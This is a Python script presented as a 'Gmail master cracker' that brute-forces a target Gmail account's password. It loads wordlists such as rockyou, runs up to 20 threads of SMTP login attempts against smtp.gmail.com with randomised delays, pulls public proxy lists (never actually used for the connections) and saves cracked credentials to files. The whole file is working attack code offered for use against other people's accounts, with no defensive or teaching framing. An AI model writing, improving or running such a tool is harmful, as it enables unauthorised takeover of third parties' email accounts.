#!/usr/bin/env python3

import smtplib
import logging
import json
import threading
import queue
import time
import sys
import os
import requests
import random
from datetime import datetime
from colorama import Fore, Style, init
from typing import List, Dict
from tqdm import tqdm

init(autoreset=True)

class GmailCracker:
    def __init__(self):
        self.banner()
        self.password_queue = queue.Queue()
        self.results = []
        self.success = False
        self.threads = []
        self.proxies = self.load_proxies()
        
    def banner(self):
        print(f"""{Fore.RED}
╔══════════════════════════════════════════════════════════════════════════════╗
║                           GMAIL MASTER CRACKER V2.0                          ║
║                      Advanced Password Testing Platform                      ║
║                  Supports All Major Wordlist Collections                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")

    def load_advanced_wordlists(self):
        wordlists = {
            '1': '/usr/share/wordlists/rockyou.txt',
            '2': '/usr/share/wordlists/fasttrack.txt',
            '3': '/usr/share/wordlists/dirb/common.txt',
            '4': '/usr/share/wordlists/metasploit/password.lst',
            '5': '/usr/share/wordlists/nmap.lst',
            '6': '/usr/share/wordlists/wfuzz/general/big.txt',
            '7': '/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt',
            '8': 'custom_path'
        }
        
        print(f"\n{Fore.CYAN}Available Wordlists:{Style.RESET_ALL}")
        print("1. RockYou (14 million passwords)")
        print("2. Fasttrack (222 passwords)")
        print("3. DIRB Common")
        print("4. Metasploit Passwords")
        print("5. Nmap Default Passwords")
        print("6. WFuzz General")
        print("7. SecLists Common")
        print("8. Custom Wordlist Path")
        print("9. Combine Multiple Wordlists")
        
        choice = input(f"\n{Fore.YELLOW}Select wordlist [1-9]: {Style.RESET_ALL}")
        
        if choice == '8':
            custom_path = input(f"{Fore.YELLOW}Enter path to wordlist: {Style.RESET_ALL}")
            return self.load_wordlist_file(custom_path)
        elif choice == '9':
            return self.combine_wordlists()
        elif choice in wordlists:
            return self.load_wordlist_file(wordlists[choice])
        
        return self.load_default_passwords()

    def combine_wordlists(self) -> List[str]:
        combined_passwords = set()
        while True:
            path = input(f"{Fore.YELLOW}Enter wordlist path (or 'done' to finish): {Style.RESET_ALL}")
            if path.lower() == 'done':
                break
            try:
                with open(path, 'r', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                    combined_passwords.update(passwords)
                    print(f"{Fore.GREEN}Added {len(passwords)} passwords{Style.RESET_ALL}")
            except FileNotFoundError:
                print(f"{Fore.RED}Wordlist not found: {path}{Style.RESET_ALL}")
        
        return list(combined_passwords)

    def load_wordlist_file(self, path: str) -> List[str]:
        try:
            with open(path, 'r', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
                print(f"{Fore.GREEN}Successfully loaded {len(passwords)} passwords{Style.RESET_ALL}")
                return passwords
        except FileNotFoundError:
            print(f"{Fore.RED}Wordlist not found: {path}")
            return self.load_default_passwords()

    def load_default_passwords(self) -> List[str]:
        return [
            "password123", "admin123", "letmein", "welcome",
            "123456789", "12345678", "1234567", "password1",
            "11111111", "123123123", "123321", "qwerty123"
        ]

    def load_proxies(self) -> List[str]:
        proxy_apis = [
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt'
        ]
        
        proxies = set()
        for api in proxy_apis:
            try:
                response = requests.get(api, timeout=10)
                new_proxies = [line.strip() for line in response.text.split('\n') if line.strip()]
                proxies.update(new_proxies)
            except:
                continue
        
        return list(proxies)

    def get_random_proxy(self) -> Dict:
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

    def test_password(self, email: str, password: str) -> bool:
        try:
            proxy = self.get_random_proxy()
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
            server.ehlo()
            server.login(email, password)
            server.quit()
            return True
        except:
            return False

    def worker(self, email: str):
        while not self.success and not self.password_queue.empty():
            try:
                password = self.password_queue.get_nowait()
            except queue.Empty:
                break

            if self.test_password(email, password):
                self.success = True
                print(f"\n{Fore.GREEN}[SUCCESS] Password Found: {password}{Style.RESET_ALL}")
                self.results.append({
                    'email': email,
                    'password': password,
                    'timestamp': datetime.now().isoformat()
                })
                with open('found_passwords.txt', 'a') as f:
                    f.write(f"{email}:{password}\n")
                break
            
            time.sleep(random.uniform(1, 3))
            self.password_queue.task_done()

    def start_attack(self):
        email = input(f"\n{Fore.YELLOW}Enter target email: {Style.RESET_ALL}")
        thread_count = int(input(f"{Fore.YELLOW}Enter number of threads (1-20): {Style.RESET_ALL}"))
        thread_count = min(max(thread_count, 1), 20)
        
        passwords = self.load_advanced_wordlists()
        for password in passwords:
            self.password_queue.put(password)
        
        print(f"\n{Fore.CYAN}Starting attack with {thread_count} threads")
        print(f"Loaded {len(passwords)} passwords")
        print(f"Using {len(self.proxies)} proxies{Style.RESET_ALL}")
        
        for _ in range(thread_count):
            thread = threading.Thread(target=self.worker, args=(email,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        with tqdm(total=len(passwords), desc="Testing Passwords", dynamic_ncols=True) as pbar:
            last_qsize = self.password_queue.qsize()
            while not self.success and not self.password_queue.empty():
                current_qsize = self.password_queue.qsize()
                completed = last_qsize - current_qsize
                if completed > 0:
                    pbar.update(completed)
                    last_qsize = current_qsize
                time.sleep(0.1)
        
        if not self.success:
            print(f"\n{Fore.RED}Attack completed - No password found{Style.RESET_ALL}")
        
        self.export_results()

    def export_results(self):
        report = {
            'timestamp': datetime.now().isoformat(),
            'results': self.results,
            'stats': {
                'total_passwords_tested': len(self.results),
                'success': self.success,
                'proxies_used': len(self.proxies)
            }
        }
        
        filename = f'attack_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4)

def main():
    try:
        cracker = GmailCracker()
        cracker.start_attack()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Attack terminated by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()

